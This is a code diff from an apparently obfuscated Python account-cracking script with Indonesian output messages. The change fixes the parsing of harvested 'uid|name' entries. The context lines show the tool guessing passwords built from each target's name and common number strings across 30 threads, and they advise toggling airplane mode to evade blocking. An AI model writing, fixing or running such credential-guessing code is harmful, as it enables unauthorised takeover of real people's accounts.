@@ -234,7 +234,7 @@ def _____LANGSUNG_____():
 	______DICKYxXD______(" %s[%s!%s] %sjika tidak %sada %shasil mode pesawatkan -> %s5 detik\n"%(p,M,p,p,p,p,p))
 	with ThreadPoolExecutor(max_workers=30) as dicky:
 		for user in id:
-			uid, name = user.split.lower("|")
+			uid, name = user.split("|")[0],user.split("|")[1].lower()
 			nam = name.split(' ')
 			if len(name) == 3 or len(name) == 4 or len(name) == 5:
 				pwx = [name, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345", nam[0]+"786", nam[0]+"1122", "112233", "223344", "334455", "445566", "556677", "778899", "102030", "1234567"]
